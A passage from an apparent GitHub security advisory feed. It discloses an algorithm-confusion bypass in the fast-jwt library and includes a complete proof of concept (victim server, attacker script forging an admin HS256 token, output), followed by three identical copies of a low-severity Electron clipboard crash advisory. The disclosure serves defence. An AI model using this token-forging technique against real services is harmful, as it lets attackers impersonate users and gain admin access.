<p> The fix for CVE-2023-48223 (<a href="https://github.com/nearform/fast-jwt/commit/15a6e92">https://github.com/nearform/fast-jwt/commit/15a6e92</a>, v3.3.2) changed the public key matcher from a
  plain string used with .includes() to a regex used with .match():</p>
<pre><code>  // Before fix (vulnerable to original CVE)
  const publicKeyPemMatcher = '-----BEGIN PUBLIC KEY-----'
  // .includes() matched anywhere in the string — not vulnerable to whitespace

  // After fix (current code, line 28)
  const publicKeyPemMatcher = /^-----BEGIN(?: (RSA))? PUBLIC KEY-----/
  // ^ anchor requires match at position 0 — defeated by leading whitespace

  In performDetectPublicKeyAlgorithms()
  (https://github.com/nearform/fast-jwt/blob/0ff14a687b9af786bd3ffa870d6febe6e1f13aaa/src/crypto.js#L126-L137):

  function performDetectPublicKeyAlgorithms(key) {
    const publicKeyPemMatch = key.match(publicKeyPemMatcher)  // no .trim()!

    if (key.match(privateKeyPemMatcher)) {
      throw ...
    } else if (publicKeyPemMatch &amp;&amp; publicKeyPemMatch[1] === 'RSA') {
      return rsaAlgorithms      // ← correct path: restricts to RS/PS algorithms
    } else if (!publicKeyPemMatch &amp;&amp; !key.includes(publicKeyX509CertMatcher)) {
      return hsAlgorithms        // ← VULNERABLE: RSA key falls through here
    }
</code></pre>
<p>  When the key string has any leading whitespace (space, tab, \n, \r\n), the ^ anchor fails, publicKeyPemMatch is null, and the RSA
  public key is classified as an HMAC secret (hsAlgorithms). The attacker can then sign an HS256 token using the public key as the
  HMAC secret — the exact same attack as CVE-2023-48223.</p>
<p>  Notably, the private key detection function does call .trim() before matching
  <a href="https://github.com/nearform/fast-jwt/blob/0ff14a687b9af786bd3ffa870d6febe6e1f13aaa/src/crypto.js#L79">https://github.com/nearform/fast-jwt/blob/0ff14a687b9af786bd3ffa870d6febe6e1f13aaa/src/crypto.js#L79</a>:
const pemData = key.trim().match(privateKeyPemMatcher)  // trims — not vulnerable</p>
<p>  The public key path does not. This inconsistency is the root cause.</p>
<p>  Leading whitespace in PEM key strings is common in real-world deployments:</p>
<ul>
<li>PostgreSQL/MySQL text columns often return strings with leading newlines</li>
<li>YAML multiline strings (|, &gt;) can introduce leading whitespace</li>
<li>Environment variables with embedded newlines</li>
<li>Copy-paste into configuration files</li>
</ul>
<h3 id="poc">PoC</h3>
<p> Victim server (server.js):</p>
<pre><code>  const http = require('node:http');
  const { generateKeyPairSync } = require('node:crypto');
  const fs = require('node:fs');
  const path = require('node:path');
  const { createSigner, createVerifier } = require('fast-jwt');

  const port = 3000;

  // Generate RSA key pair
  const { publicKey, privateKey } = generateKeyPairSync('rsa', { modulusLength: 2048 });
  const publicKeyPem = publicKey.export({ type: 'pkcs1', format: 'pem' });
  const privateKeyPem = privateKey.export({ type: 'pkcs8', format: 'pem' });

  // Simulate real-world scenario: key retrieved from database with leading newline
  const publicKeyFromDB = '\n' + publicKeyPem;

  // Write public key to disk so attacker can recover it
  fs.writeFileSync(path.join(__dirname, 'public_key.pem'), publicKeyFromDB);

  const server = http.createServer((req, res) =&gt; {
    const url = new URL(req.url, `http://localhost:${port}`);

    // Endpoint to generate a JWT token with admin: false
    if (url.pathname === '/generateToken') {
      const payload = { admin: false, name: url.searchParams.get('name') || 'anonymous' };
      const signSync = createSigner({ algorithm: 'RS256', key: privateKeyPem });
      const token = signSync(payload);
      res.writeHead(200, { 'Content-Type': 'application/json' });
      res.end(JSON.stringify({ token }));
      return;
    }

    // Endpoint to check if you are the admin or not
    if (url.pathname === '/checkAdmin') {
      const token = url.searchParams.get('token');
      try {
        const verifySync = createVerifier({ key: publicKeyFromDB });
        const payload = verifySync(token);
        res.writeHead(200, { 'Content-Type': 'application/json' });
        res.end(JSON.stringify(payload));
      } catch (err) {
        res.writeHead(401, { 'Content-Type': 'application/json' });
        res.end(JSON.stringify({ error: err.message }));
      }
      return;
    }

    res.writeHead(404);
    res.end('Not found');
  });

  server.listen(port, () =&gt; console.log(`Server running on http://localhost:${port}`));
</code></pre>
<p>  Attacker script (attacker.js):</p>
<pre><code>  const { createHmac } = require('node:crypto');
  const fs = require('node:fs');
  const path = require('node:path');

  const serverUrl = 'http://localhost:3000';

  async function main() {
    // Step 1: Get a legitimate token
    const res = await fetch(`${serverUrl}/generateToken?name=attacker`);
    const { token: legitimateToken } = await res.json();
    console.log('Legitimate token payload:',
      JSON.parse(Buffer.from(legitimateToken.split('.')[1], 'base64url')));

    // Step 2: Recover the public key
    // (In the original advisory: python3 jwt_forgery.py token1 token2)
    const publicKey = fs.readFileSync(path.join(__dirname, 'public_key.pem'), 'utf8');

    // Step 3: Forge an HS256 token with admin: true
    // (In the original advisory: python jwt_tool.py --exploit k -pk public_key token)
    const header = Buffer.from(JSON.stringify({ alg: 'HS256', typ: 'JWT' })).toString('base64url');
    const payload = Buffer.from(JSON.stringify({
      admin: true, name: 'attacker',
      iat: Math.floor(Date.now() / 1000),
      exp: Math.floor(Date.now() / 1000) + 3600
    })).toString('base64url');
    const signature = createHmac('sha256', publicKey)
      .update(header + '.' + payload).digest('base64url');
    const forgedToken = header + '.' + payload + '.' + signature;

    // Step 4: Present forged token to /checkAdmin
    // 4a. Legitimate RS256 token — REJECTED
    const legRes = await fetch(`${serverUrl}/checkAdmin?token=${encodeURIComponent(legitimateToken)}`);
    console.log('Legitimate RS256 token:', legRes.status, await legRes.json());

    // 4b. Forged HS256 token — ACCEPTED
    const forgedRes = await fetch(`${serverUrl}/checkAdmin?token=${encodeURIComponent(forgedToken)}`);
    console.log('Forged HS256 token:', forgedRes.status, await forgedRes.json());
  }

  main().catch(console.error);
</code></pre>
<p>  Running the PoC:</p>
<h1 id="terminal-1">Terminal 1</h1>
<p>  node server.js</p>
<h1 id="terminal-2">Terminal 2</h1>
<p>  node attacker.js</p>
<p>  Output:
  Legitimate token payload: { admin: false, name: 'attacker', iat: 1774307691 }
  Legitimate RS256 token: 401 { error: 'The token algorithm is invalid.' }
  Forged HS256 token: 200 { admin: true, name: 'attacker', iat: 1774307691, exp: 1774311291 }</p>
<p>  The legitimate RS256 token is rejected (the key is misclassified so RS256 is not in the allowed algorithms), while the attacker's
  forged HS256 token is accepted with admin: true.</p>
<h3 id="impact">Impact</h3>
<p>Applications using the RS256 algorithm, a public key with any leading whitespace before the PEM header, and calling the verify
function without explicitly providing an algorithm, are vulnerable to this algorithm confusion attack which allows attackers to
sign arbitrary payloads which will be accepted by the verifier.
This is a direct bypass of the fix for CVE-2023-48223 / GHSA-c2ff-88x2-x9pg. The attack requirements are identical to the original
CVE: the attacker only needs knowledge of the server's RSA public key (which is public by definition).</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/nearform/fast-jwt/security/advisories/GHSA-mvf2-f6gm-w987">https://github.com/nearform/fast-jwt/security/advisories/GHSA-mvf2-f6gm-w987</a></li>
<li><a href="https://github.com/advisories/GHSA-c2ff-88x2-x9pg">https://github.com/advisories/GHSA-c2ff-88x2-x9pg</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-34950">https://nvd.nist.gov/vuln/detail/CVE-2026-34950</a></li>
<li><a href="https://github.com/advisories/GHSA-mvf2-f6gm-w987">https://github.com/advisories/GHSA-mvf2-f6gm-w987</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-mvf2-f6gm-w987</uri>
        </author>
        <category label="severity" term="CRITICAL"/>
        <published>2026-04-02T20:37:54.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[electron] Electron: Crash in clipboard.readImage() on malformed clipboard image data]]></title>
        <id>https://github.com/advisories/GHSA-f37v-82c4-4x64</id>
        <link href="https://github.com/advisories/GHSA-f37v-82c4-4x64"/>
        <updated>2026-04-07T15:52:32.000Z</updated>
        <content type="html"><![CDATA[<h3 id="impact">Impact</h3>
<p>Apps that call <code>clipboard.readImage()</code> may be vulnerable to a denial of service. If the system clipboard contains image data that fails to decode, the resulting null bitmap is passed unchecked to image construction, triggering a controlled abort and crashing the process.</p>
<p>Apps are only affected if they call <code>clipboard.readImage()</code>. Apps that do not read images from the clipboard are not affected. This issue does not allow memory corruption or code execution.</p>
<h3 id="workarounds">Workarounds</h3>
<p>Validate that the clipboard contains image data via <code>clipboard.availableFormats()</code> before calling <code>clipboard.readImage()</code>. Note this only narrows the window — upgrading to a fixed version is recommended.</p>
<h3 id="fixed-versions">Fixed Versions</h3>
<ul>
<li><code>42.0.0-alpha.5</code></li>
<li><code>41.1.0</code></li>
<li><code>40.8.5</code></li>
<li><code>39.8.5</code></li>
</ul>
<h3 id="for-more-information">For more information</h3>
<p>If you have any questions or comments about this advisory, email us at <a href="mailto:security@electronjs.org">security@electronjs.org</a></p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/electron/electron/security/advisories/GHSA-f37v-82c4-4x64">https://github.com/electron/electron/security/advisories/GHSA-f37v-82c4-4x64</a></li>
<li><a href="https://github.com/electron/electron/pull/50475">https://github.com/electron/electron/pull/50475</a></li>
<li><a href="https://github.com/electron/electron/commit/a48f03fb8d03933547281ddb2dbb6c6b9e705287">https://github.com/electron/electron/commit/a48f03fb8d03933547281ddb2dbb6c6b9e705287</a></li>
<li><a href="https://github.com/electron/electron/releases/tag/v39.8.5">https://github.com/electron/electron/releases/tag/v39.8.5</a></li>
<li><a href="https://github.com/electron/electron/releases/tag/v40.8.5">https://github.com/electron/electron/releases/tag/v40.8.5</a></li>
<li><a href="https://github.com/electron/electron/releases/tag/v41.1.0">https://github.com/electron/electron/releases/tag/v41.1.0</a></li>
<li><a href="https://github.com/electron/electron/releases/tag/v42.0.0-alpha.5">https://github.com/electron/electron/releases/tag/v42.0.0-alpha.5</a></li>
<li><a href="https://github.com/advisories/GHSA-f37v-82c4-4x64">https://github.com/advisories/GHSA-f37v-82c4-4x64</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-f37v-82c4-4x64</uri>
        </author>
        <category label="severity" term="LOW"/>
        <published>2026-04-07T15:52:28.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[electron] Electron: Crash in clipboard.readImage() on malformed clipboard image data]]></title>
        <id>https://github.com/advisories/GHSA-f37v-82c4-4x64</id>
        <link href="https://github.com/advisories/GHSA-f37v-82c4-4x64"/>
        <updated>2026-04-07T15:52:32.000Z</updated>
        <content type="html"><![CDATA[<h3 id="impact">Impact</h3>
<p>Apps that call <code>clipboard.readImage()</code> may be vulnerable to a denial of service. If the system clipboard contains image data that fails to decode, the resulting null bitmap is passed unchecked to image construction, triggering a controlled abort and crashing the process.</p>
<p>Apps are only affected if they call <code>clipboard.readImage()</code>. Apps that do not read images from the clipboard are not affected. This issue does not allow memory corruption or code execution.</p>
<h3 id="workarounds">Workarounds</h3>
<p>Validate that the clipboard contains image data via <code>clipboard.availableFormats()</code> before calling <code>clipboard.readImage()</code>. Note this only narrows the window — upgrading to a fixed version is recommended.</p>
<h3 id="fixed-versions">Fixed Versions</h3>
<ul>
<li><code>42.0.0-alpha.5</code></li>
<li><code>41.1.0</code></li>
<li><code>40.8.5</code></li>
<li><code>39.8.5</code></li>
</ul>
<h3 id="for-more-information">For more information</h3>
<p>If you have any questions or comments about this advisory, email us at <a href="mailto:security@electronjs.org">security@electronjs.org</a></p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/electron/electron/security/advisories/GHSA-f37v-82c4-4x64">https://github.com/electron/electron/security/advisories/GHSA-f37v-82c4-4x64</a></li>
<li><a href="https://github.com/electron/electron/pull/50475">https://github.com/electron/electron/pull/50475</a></li>
<li><a href="https://github.com/electron/electron/commit/a48f03fb8d03933547281ddb2dbb6c6b9e705287">https://github.com/electron/electron/commit/a48f03fb8d03933547281ddb2dbb6c6b9e705287</a></li>
<li><a href="https://github.com/electron/electron/releases/tag/v39.8.5">https://github.com/electron/electron/releases/tag/v39.8.5</a></li>
<li><a href="https://github.com/electron/electron/releases/tag/v40.8.5">https://github.com/electron/electron/releases/tag/v40.8.5</a></li>
<li><a href="https://github.com/electron/electron/releases/tag/v41.1.0">https://github.com/electron/electron/releases/tag/v41.1.0</a></li>
<li><a href="https://github.com/electron/electron/releases/tag/v42.0.0-alpha.5">https://github.com/electron/electron/releases/tag/v42.0.0-alpha.5</a></li>
<li><a href="https://github.com/advisories/GHSA-f37v-82c4-4x64">https://github.com/advisories/GHSA-f37v-82c4-4x64</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-f37v-82c4-4x64</uri>
        </author>
        <category label="severity" term="LOW"/>
        <published>2026-04-07T15:52:28.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[electron] Electron: Crash in clipboard.readImage() on malformed clipboard image data]]></title>
        <id>https://github.com/advisories/GHSA-f37v-82c4-4x64</id>
        <link href="https://github.com/advisories/GHSA-f37v-82c4-4x64"/>
        <updated>2026-04-07T15:52:32.000Z</updated>
        <content type="html"><![CDATA[<h3 id="impact">Impact</h3>
<p>Apps that call <code>clipboard.readImage()</code> may be vulnerable to a denial of service. If the system clipboard contains image data that fails to decode, the resulting null bitmap is passed unchecked to image construction, triggering a controlled abort and crashing the process.</p>
<p>Apps are only affected if they call <code>clipboard.readImage()</code>. Apps that do not read images from the clipboard are not affected. This issue does not allow memory corruption or code execution.</p>
<h3 id="workarounds">Workarounds</h3>
<p>Validate that the clipboard contains image data via <code>clipboard.availableFormats()</code> before calling <code>clipboard.readImage()</code>. Note this only narrows the window — upgrading to a fixed version is recommended.</p>
<h3 id="fixed-versions">Fixed Versions</h3>
<ul>
<li><code>42.0.0-alpha.5</code></li>
<li><code>41.1.0</code></li>
<li><code>40.8.5</code></li>
<li><code>39.8.5</code></li>
</ul>
<h3 id="for-more-information">For more information</h3>
<p>If you have any questions or comments about this advisory, email us at <a href="mailto:security@electronjs.org">security@electronjs.org</a></p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/electron/electron/security/advisories/GHSA-f37v-82c4-4x64">https://github.com/electron/electron/security/advisories/GHSA-f37v-82c4-4x64</a></li>
<li><a href="https://github.com/electron/electron/pull/50475">https://github.com/electron/electron/pull/50475</a></li>
<li><a href="https://github.com/electron/electron/commit/a48f03fb8d03933547281ddb2dbb6c6b9e705287">https://github.com/electron/electron/commit/a48f03fb8d03933547281ddb2dbb6c6b9e705287</a></li>
<li><a href="https://github.com/electron/electron/releases/tag/v39.8.5">https://github.com/electron/electron/releases/tag/v39.8.5</a></li>
<li><a href="https://github.com/electron/electron/releases/tag/v40.8.5">https://github.com/electron/electron/releases/tag/v40.8.5</a></li>
<li><a href="https://github.com/electron/electron/releases/tag/v41.1.0">https://github.com/electron/electron/releases/tag/v41.1.0</a></li>
<li><a href="https://github.com/electron/electron/releases/tag/v42.0.0-alpha.5">https://github.com/electron/electron/releases/tag/v42.0.0-alpha.5</a></li>
<li><a href="https://github.com/advisories/GHSA-f37v-82c4-4x64">https://github.com/advisories/GHSA-f37v-82c4-4x64</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-f37v-82c4-4x64</uri>
        </author>
        <category label="severity" term="LOW"/>
        <published>2026-04-07T15:52:28.000Z</published>
    </entry>
</feed>